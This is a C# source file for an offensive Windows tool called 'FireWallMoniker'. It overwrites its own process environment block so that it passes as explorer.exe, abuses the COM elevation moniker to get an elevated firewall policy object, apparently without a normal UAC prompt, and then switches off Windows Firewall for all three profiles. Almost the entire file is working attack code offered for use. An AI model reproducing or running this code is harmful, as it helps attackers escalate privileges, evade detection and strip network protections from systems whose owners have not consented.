using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using FireWallMoniker;
using static FireWallMoniker.Helpers; 


namespace FireWallMoniker
{
    class Program
    {
        private static void DisableFirewall(Helpers.INetFwPolicy2 firewallPolicy, Helpers.NET_FW_PROFILE_TYPE2_ profile)
        {
            try
            {
                firewallPolicy.put_FirewallEnabled(profile, false);
                Console.WriteLine($"[+] {profile} Firewall Disabled.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Failed to disable firewall for {profile}: {ex.Message}");
            }
        }

        public static void wall()
        {
            string[] brickWall = new string[]
         {
                "=========================================================================================",
                "|| || || || || || || || || || || || || || || || || || || || || || || || || || || || || ||",
                "|| || || || || || || || || || || || || || || || || || || || || || || || || || || || || ||",
                "=========================================================================================",
                "|| || || || || || || || || || ||Firewall Moniker|| || || || || || || || || || || || || ||",
                "|| || || || || || || || || || || Lefty@2024  || || || || || || || || || || || || || || ||",
                "=========================================================================================",
                "|| || || || || || || || || || || || || || || || || || || || || || || || || || || || || ||",
                "|| || || || || || || || || || || || || || || || || || || || || || || || || || || || || ||",
                "========================================================================================="
         };

            foreach (var line in brickWall)
            {
                Console.WriteLine(line);
            }
        }

        public static void patch()
        {
            //PEB technique from https://github.com/zcgonvh/TaskSchedulerMisc/blob/dd02f0ed7ebd2612647aaedc3dec952d0d0ab97d/schuac.cs#L23
            Console.Write("[+] Patching PEB to become explorer.exe");
            var explorer = "explorer.exe";
            var explorer2 = @"c:\windows\explorer.exe";
            var PPEB = RtlGetCurrentPeb();
            PEB PEB = (PEB)Marshal.PtrToStructure(PPEB, typeof(PEB));
            bool x86 = Marshal.SizeOf(typeof(IntPtr)) == 4;
            var pImagePathName = new IntPtr(PEB.ProcessParameters.ToInt64() + (x86 ? 0x38 : 0x60));
            var pCommandLine = new IntPtr(PEB.ProcessParameters.ToInt64() + (x86 ? 0x40 : 0x70));
            RtlInitUnicodeString(pImagePathName, explorer2);
            RtlInitUnicodeString(pCommandLine, explorer2);

            PEB_LDR_DATA PEB_LDR_DATA = (PEB_LDR_DATA)Marshal.PtrToStructure(PEB.Ldr, typeof(PEB_LDR_DATA));
            LDR_DATA_TABLE_ENTRY LDR_DATA_TABLE_ENTRY;
            var pFlink = new IntPtr(PEB_LDR_DATA.InLoadOrderModuleList.Flink.ToInt64());
            var first = pFlink;
            do
            {
                LDR_DATA_TABLE_ENTRY = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(pFlink, typeof(LDR_DATA_TABLE_ENTRY));
                if (LDR_DATA_TABLE_ENTRY.FullDllName.Buffer.ToInt64() < 0 || LDR_DATA_TABLE_ENTRY.BaseDllName.Buffer.ToInt64() < 0)
                {
                    pFlink = LDR_DATA_TABLE_ENTRY.InLoadOrderLinks.Flink;
                    continue;
                }
                try
                {
                    if (Marshal.PtrToStringUni(LDR_DATA_TABLE_ENTRY.FullDllName.Buffer).EndsWith(".exe"))
                    {
                        RtlInitUnicodeString(new IntPtr(pFlink.ToInt64() + (x86 ? 0x24 : 0x48)), explorer2);
                        RtlInitUnicodeString(new IntPtr(pFlink.ToInt64() + (x86 ? 0x2c : 0x58)), explorer);
                        LDR_DATA_TABLE_ENTRY = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(pFlink, typeof(LDR_DATA_TABLE_ENTRY));
                        break;
                    }
                }
                catch { }
                pFlink = LDR_DATA_TABLE_ENTRY.InLoadOrderLinks.Flink;
            } while (pFlink != first);
            Console.WriteLine("\n[+] Process PEB is patched!");
        }


        [return: MarshalAs(UnmanagedType.Interface)]
        static object CoCreateInstanceElevated(IntPtr parentWindow, Type comClass, object xxxx)
        {
            var monikerName = "Elevation:Administrator!new:" + comClass.GUID.ToString("B").ToUpper();
            var bo = new BIND_OPTS3();
            bo.cbStruct = (uint)Marshal.SizeOf(typeof(BIND_OPTS3));
            bo.hwnd = parentWindow;
            bo.dwClassContext = CLSCTX.CLSCTX_LOCAL_SERVER;

            Guid unknownGuid = Guid.Parse("98325047-C671-4174-8D81-DEFCD3F03186");
            var obj = CoGetObject(monikerName, ref bo, unknownGuid);
            return obj;
        }

        [STAThread]
        static void Main(string[] args)
        {
            try
            {
                wall();
                patch();

                int hrInit = CoInitializeEx((IntPtr)(0), 0x2); // COINIT_APARTMENTTHREADED
                if (hrInit < 0)
                {
                    Console.WriteLine($"[!] CoInitializeEx failed: 0x{hrInit:X8}");
                    return;
                }
                try
                {
                    var hwnd = GetConsoleWindow();

                    object pNetFwPolicy2Obj;
                    Guid CLSID_NetFwPolicy2 = new Guid("E2B3C97F-6AE1-41AC-817A-F6F92166D7DD");
                    Guid IID_INetFwPolicy2 = new Guid("98325047-C671-4174-8D81-DEFCD3F03186");

                    int hr = CoCreateInstance(ref CLSID_NetFwPolicy2, IntPtr.Zero, CLSCTX.CLSCTX_ALL, ref IID_INetFwPolicy2, out pNetFwPolicy2Obj);
                    if (hr != 0) // S_OK is 0
                    {
                        Console.WriteLine($"[!] CoCreateInstance for INetFwPolicy2 failed: 0x{hr:X8}");
                        return;
                    }
                    object obj = null;
                    Type comCls = Type.GetTypeFromProgID("HNetCfg.FwPolicy2");
                    obj = CoCreateInstanceElevated((IntPtr)0, comCls, pNetFwPolicy2Obj);

                    Helpers.INetFwPolicy2 firewallPolicy = obj as Helpers.INetFwPolicy2;
                    if (firewallPolicy == null)
                    {
                        Console.WriteLine("[!] Failed to cast to INetFwPolicy2.");
                        return;
                    }

                    DisableFirewall(firewallPolicy, Helpers.NET_FW_PROFILE_TYPE2_.NET_FW_PROFILE2_DOMAIN);
                    DisableFirewall(firewallPolicy, Helpers.NET_FW_PROFILE_TYPE2_.NET_FW_PROFILE2_PRIVATE);
                    DisableFirewall(firewallPolicy, Helpers.NET_FW_PROFILE_TYPE2_.NET_FW_PROFILE2_PUBLIC);

                    Marshal.ReleaseComObject(firewallPolicy);
                }
                catch (COMException comEx)
                {
                    Console.WriteLine($"[!] COM Exception: {comEx.Message}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] General Exception: {ex.Message}");
                }
                finally
                {
                    CoUninitialize();
                }

                Console.WriteLine("[+] Windows Firewall disabled for Domain, Private, and Public profiles.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }
    }
}